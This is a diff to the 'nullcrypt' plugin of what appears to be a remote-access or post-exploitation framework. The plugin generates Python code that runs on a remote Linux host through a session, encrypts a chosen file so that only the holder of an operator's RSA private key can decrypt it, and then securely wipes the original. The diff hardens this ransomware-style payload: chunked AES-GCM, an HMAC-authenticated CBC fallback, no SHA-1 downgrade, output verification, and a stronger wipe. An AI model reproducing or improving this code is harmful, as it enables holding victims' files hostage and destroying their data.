@@ -25,8 +25,9 @@ Usage:
   run nullcrypt help
 
 Cryptography:
-  - File data: AES-256-GCM (fast symmetric encryption)
-  - AES key:   RSA-OAEP (SHA-256 preferred; SHA-1 fallback on older Windows .NET)
+  - File data: AES-256-GCM (chunked streaming when Python cryptography is available)
+               or AES-256-CBC+HMAC-SHA256 via OpenSSL as fallback
+  - AES key:   RSA-OAEP-SHA256 (required; no silent SHA-1 downgrade)
   - Only the holder of the matching private key can decrypt the .nullcrypt file
 
 After encryption succeeds, the wiper plugin runs on the original file so only
@@ -149,106 +150,270 @@ def _parse_nullcrypt_args(args):
 
 def _build_linux_nullcrypt(remote_path: str, out_path: str, pubkey_pem: str) -> str:
     source = f'''
-import os, secrets, subprocess, struct, json, base64, hashlib, tempfile, platform, shutil
+import os, secrets, subprocess, struct, json, base64, hashlib, tempfile, platform, shutil, hmac
 
 path = {json.dumps(remote_path)}
 out_path = {json.dumps(out_path)}
 pubkey_pem = {json.dumps(pubkey_pem)}
 
+CHUNK_SIZE = 1048576
+VERSION = 2
+
+def _norm_path(p):
+    return os.path.normpath(os.path.abspath(p))
+
+def _derive_nonce(iv, index):
+    return iv[:4] + int(index).to_bytes(8, 'big')
+
+def _meta_mac(key, header_obj):
+    stub = {{k: header_obj[k] for k in sorted(header_obj) if k != 'meta_mac'}}
+    canonical = json.dumps(stub, separators=(',', ':'), sort_keys=True)
+    return hmac.new(key, canonical.encode('utf-8'), hashlib.sha256).digest()
+
+def _chunk_count(size):
+    return 1 if size == 0 else (size + CHUNK_SIZE - 1) // CHUNK_SIZE
+
+def _verify_output(tmp_path, aes_key, header_bytes, header_obj, expected_size):
+    if not os.path.isfile(tmp_path):
+        return False, 'temporary output missing'
+    total = os.path.getsize(tmp_path)
+    header_len = len(header_bytes)
+    expected_min = 4 + header_len
+    if total < expected_min:
+        return False, 'output shorter than header'
+    with open(tmp_path, 'rb') as fh:
+        raw_len = fh.read(4)
+        if len(raw_len) != 4:
+            return False, 'truncated length prefix'
+        if struct.unpack('>I', raw_len)[0] != header_len:
+            return False, 'header length mismatch'
+        on_disk_header = fh.read(header_len)
+        if on_disk_header != header_bytes:
+            return False, 'header bytes mismatch'
+        cc = int(header_obj.get('chunk_count') or 0)
+        sym = header_obj.get('sym') or ''
+        if cc <= 0:
+            return False, 'invalid chunk_count'
+        stored_mac = base64.b64decode(header_obj.get('meta_mac') or '')
+        if not stored_mac or _meta_mac(aes_key, header_obj) != stored_mac:
+            return False, 'metadata authentication failed'
+        if sym == 'AES-256-GCM':
+            try:
+                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                gcm = AESGCM(aes_key)
+            except ImportError:
+                return False, 'cannot verify AES-GCM without cryptography'
+            plain_total = 0
+            for idx in range(cc):
+                remaining = expected_size - plain_total
+                if remaining <= 0 and idx < cc - 1:
+                    return False, 'unexpected extra chunk'
+                clen = min(CHUNK_SIZE, remaining) if remaining > 0 else 0
+                ct = fh.read(clen)
+                tag = fh.read(16)
+                if len(ct) != clen or len(tag) != 16:
+                    return False, 'truncated chunk %d' % idx
+                nonce = _derive_nonce(base64.b64decode(header_obj['iv']), idx)
+                try:
+                    pt = gcm.decrypt(nonce, ct + tag, None)
+                except Exception:
+                    return False, 'chunk %d authentication failed' % idx
+                plain_total += len(pt)
+            if plain_total != expected_size:
+                return False, 'decrypted size mismatch'
+            if fh.read(1):
+                return False, 'trailing data after ciphertext'
+            return True, ''
+        if sym == 'AES-256-CBC+HMAC-SHA256':
+            tag_b64 = header_obj.get('tag') or ''
+            stored_tag = base64.b64decode(tag_b64)
+            if len(stored_tag) != 32:
+                return False, 'invalid HMAC tag'
+            iv = base64.b64decode(header_obj['iv'])
+            cipher_len = total - expected_min
+            if cipher_len <= 0 or cipher_len % 16 != 0:
+                return False, 'invalid ciphertext length'
+            with open(tmp_path, 'rb') as fh:
+                fh.seek(expected_min)
+                cipher = fh.read(cipher_len)
+            computed_tag = hmac.new(aes_key, iv + cipher, hashlib.sha256).digest()
+            if not hmac.compare_digest(computed_tag, stored_tag):
+                return False, 'HMAC authentication failed'
+            dec_path = os.path.join(tempfile.gettempdir(), '.tornado_nullcrypt_verify_' + secrets.token_hex(8))
+            cipher_path = os.path.join(tempfile.gettempdir(), '.tornado_nullcrypt_cipher_' + secrets.token_hex(8))
+            try:
+                with open(cipher_path, 'wb') as cp:
+                    cp.write(cipher)
+                dec = subprocess.run(
+                    ['openssl', 'enc', '-d', '-aes-256-cbc', '-K', aes_key.hex(), '-iv', iv.hex(),
+                     '-in', cipher_path, '-out', dec_path],
+                    capture_output=True,
+                    timeout=max(120, expected_size // (1024 * 1024) * 15 + 60),
+                )
+                if dec.returncode != 0:
+                    err = dec.stderr.decode('utf-8', 'ignore').strip() or 'openssl decrypt failed'
+                    return False, err
+                if os.path.getsize(dec_path) != expected_size:
+                    return False, 'decrypted size mismatch'
+                return True, ''
+            finally:
+                for p in (dec_path, cipher_path):
+                    try:
+                        os.remove(p)
+                    except OSError:
+                        pass
+        return False, 'unsupported sym algorithm'
+    return False, 'unreachable'
+
 if not os.path.isfile(path):
     _emit({{"error": "File not found or not a regular file", "path": path, "platform": "linux"}})
+elif _norm_path(path) == _norm_path(out_path):
+    _emit({{"error": "Input and output paths refer to the same file", "path": path, "output": out_path, "platform": "linux"}})
+elif os.path.lexists(out_path):
+    _emit({{"error": "Output file already exists", "output": out_path, "platform": "linux"}})
 else:
     size = os.path.getsize(path)
     aes_key = secrets.token_bytes(32)
     iv = secrets.token_bytes(12)
-    sha = hashlib.sha256()
-    with open(path, 'rb') as fh:
-        while True:
-            chunk = fh.read(65536)
-            if not chunk:
-                break
-            sha.update(chunk)
-    digest = sha.hexdigest()
     tmpdir = tempfile.mkdtemp(prefix='.tornado_nullcrypt_')
+    tmp_out = out_path + '.nullcrypt.tmp.' + secrets.token_hex(8)
+    err_msg = ''
+    verified = False
     try:
         pk_path = os.path.join(tmpdir, 'pub.pem')
-        key_path = os.path.join(tmpdir, 'aes.key')
-        cipher_path = os.path.join(tmpdir, 'cipher.bin')
-        tag_path = os.path.join(tmpdir, 'tag.bin')
         with open(pk_path, 'w', encoding='utf-8') as fh:
             fh.write(pubkey_pem)
-        with open(key_path, 'wb') as fh:
-            fh.write(aes_key)
 
-        wrap_alg = 'RSA-OAEP-SHA256'
         wrap = subprocess.run(
             ['openssl', 'pkeyutl', '-encrypt', '-pubin', '-inkey', pk_path,
              '-pkeyopt', 'rsa_padding_mode:oaep', '-pkeyopt', 'rsa_oaep_md:sha256',
-             '-in', key_path],
+             '-in', '-'],
+            input=aes_key,
             capture_output=True,
             timeout=60,
         )
         if wrap.returncode != 0:
-            wrap = subprocess.run(
-                ['openssl', 'pkeyutl', '-encrypt', '-pubin', '-inkey', pk_path,
-                 '-pkeyopt', 'rsa_padding_mode:oaep', '-pkeyopt', 'rsa_oaep_md:sha1',
-                 '-in', key_path],
-                capture_output=True,
-                timeout=60,
-            )
-            wrap_alg = 'RSA-OAEP-SHA1'
-        if wrap.returncode != 0:
-            err = wrap.stderr.decode('utf-8', 'ignore').strip() or 'openssl pkeyutl failed'
+            err = wrap.stderr.decode('utf-8', 'ignore').strip() or 'RSA-OAEP-SHA256 wrap failed'
             raise RuntimeError(err)
         wrapped_key = wrap.stdout
+        wrap_alg = 'RSA-OAEP-SHA256'
 
-        enc_timeout = max(120, size // (1024 * 1024) * 15 + 60)
-        enc = subprocess.run(
-            ['openssl', 'enc', '-aes-256-gcm', '-K', aes_key.hex(), '-iv', iv.hex(),
-             '-in', path, '-out', cipher_path, '-tag', tag_path],
-            capture_output=True,
-            timeout=enc_timeout,
-        )
-        if enc.returncode != 0:
-            err = enc.stderr.decode('utf-8', 'ignore').strip() or 'openssl enc failed'
-            raise RuntimeError(err)
-
-        with open(cipher_path, 'rb') as fh:
-            ciphertext = fh.read()
-        with open(tag_path, 'rb') as fh:
-            tag = fh.read()
-
-        header = {{
+        chunk_count = _chunk_count(size)
+        sym = 'AES-256-GCM'
+        header_obj = {{
             "magic": "TRC2NULLCRYPT",
-            "version": 1,
-            "sym": "AES-256-GCM",
+            "version": VERSION,
+            "sym": sym,
             "wrap": wrap_alg,
             "wrapped_key": base64.b64encode(wrapped_key).decode('ascii'),
             "iv": base64.b64encode(iv).decode('ascii'),
-            "tag": base64.b64encode(tag).decode('ascii'),
+            "chunk_size": CHUNK_SIZE,
+            "chunk_count": chunk_count,
             "original": os.path.basename(path),
             "size": size,
-            "sha256": digest,
+            "sha256": "",
         }}
-        header_bytes = json.dumps(header, separators=(',', ':')).encode('utf-8')
-        with open(out_path, 'wb') as out:
-            out.write(struct.pack('>I', len(header_bytes)))
-            out.write(header_bytes)
-            out.write(ciphertext)
 
-        verified = os.path.isfile(out_path) and os.path.getsize(out_path) > len(header_bytes) + 4
+        sha = hashlib.sha256()
+        use_crypto = False
+        try:
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            use_crypto = True
+        except ImportError:
+            pass
+
+        if use_crypto:
+            gcm = AESGCM(aes_key)
+            body_path = os.path.join(tmpdir, 'body.bin')
+            with open(path, 'rb') as src, open(body_path, 'wb') as body:
+                for idx in range(chunk_count):
+                    chunk = src.read(CHUNK_SIZE)
+                    sha.update(chunk)
+                    nonce = _derive_nonce(iv, idx)
+                    sealed = gcm.encrypt(nonce, chunk, None)
+                    if len(sealed) != len(chunk) + 16:
+                        raise RuntimeError('unexpected GCM output size')
+                    body.write(sealed[:-16])
+                    body.write(sealed[-16:])
+            header_obj['sha256'] = sha.hexdigest()
+            header_obj['meta_mac'] = base64.b64encode(_meta_mac(aes_key, header_obj)).decode('ascii')
+            header_bytes = json.dumps(header_obj, separators=(',', ':')).encode('utf-8')
+            with open(tmp_out, 'wb') as out, open(body_path, 'rb') as body:
+                out.write(struct.pack('>I', len(header_bytes)))
+                out.write(header_bytes)
+                shutil.copyfileobj(body, out, 65536)
+                out.flush()
+                os.fsync(out.fileno())
+        else:
+            sym = 'AES-256-CBC+HMAC-SHA256'
+            header_obj['sym'] = sym
+            header_obj['chunk_count'] = 1
+            header_obj['chunk_size'] = size if size > 0 else CHUNK_SIZE
+            iv_cbc = secrets.token_bytes(16)
+            cipher_path = os.path.join(tmpdir, 'cipher.bin')
+            with open(path, 'rb') as fh:
+                while True:
+                    block = fh.read(65536)
+                    if not block:
+                        break
+                    sha.update(block)
+            header_obj['sha256'] = sha.hexdigest()
+            header_obj['iv'] = base64.b64encode(iv_cbc).decode('ascii')
+            enc_timeout = max(120, size // (1024 * 1024) * 15 + 60)
+            enc = subprocess.run(
+                ['openssl', 'enc', '-aes-256-cbc', '-K', aes_key.hex(), '-iv', iv_cbc.hex(),
+                 '-in', path, '-out', cipher_path],
+                capture_output=True,
+                timeout=enc_timeout,
+            )
+            if enc.returncode != 0:
+                err = enc.stderr.decode('utf-8', 'ignore').strip() or 'openssl enc failed'
+                raise RuntimeError(err)
+            with open(cipher_path, 'rb') as fh:
+                cipher = fh.read()
+            tag = hmac.new(aes_key, iv_cbc + cipher, hashlib.sha256).digest()
+            header_obj['tag'] = base64.b64encode(tag).decode('ascii')
+            header_obj['meta_mac'] = base64.b64encode(_meta_mac(aes_key, header_obj)).decode('ascii')
+            header_bytes = json.dumps(header_obj, separators=(',', ':')).encode('utf-8')
+            with open(tmp_out, 'wb') as out:
+                out.write(struct.pack('>I', len(header_bytes)))
+                out.write(header_bytes)
+                out.write(cipher)
+                out.flush()
+                os.fsync(out.fileno())
+
+        verified, verr = _verify_output(tmp_out, aes_key, header_bytes, header_obj, size)
+        if not verified:
+            raise RuntimeError('encryption verification failed: ' + (verr or 'unknown'))
+
+        os.replace(tmp_out, out_path)
+        tmp_out = ''
         _emit({{
             "path": path,
             "output": out_path,
             "size": size,
-            "output_size": os.path.getsize(out_path) if verified else 0,
-            "algorithm": "AES-256-GCM + " + wrap_alg,
-            "sha256": digest,
-            "verified": verified,
+            "output_size": os.path.getsize(out_path),
+            "algorithm": sym + ' + ' + wrap_alg,
+            "sha256": header_obj['sha256'],
+            "verified": True,
             "platform": platform.system(),
             "message": "File encrypted; original ready for secure wipe",
         }})
+    except Exception as exc:
+        err_msg = str(exc)
+        _emit({{
+            "error": err_msg,
+            "path": path,
+            "output": out_path,
+            "platform": platform.system(),
+            "verified": False,
+        }})
     finally:
+        if tmp_out and os.path.lexists(tmp_out):
+            try:
+                os.remove(tmp_out)
+            except OSError:
+                pass
         shutil.rmtree(tmpdir, ignore_errors=True)
 '''
     return build_linux_collector_command(source)
@@ -435,7 +600,7 @@ def run(session: SessionContext, args):
     session._handler._flush_shell(session._client_sock, timeout=3.0)
     wipe_rc, wipe_data = wiper_plugin.run(
         session,
-        [remote_path, 'method=quick'],
+        [remote_path, 'method=standard'],
         quiet=True,
         return_result=True,
     )
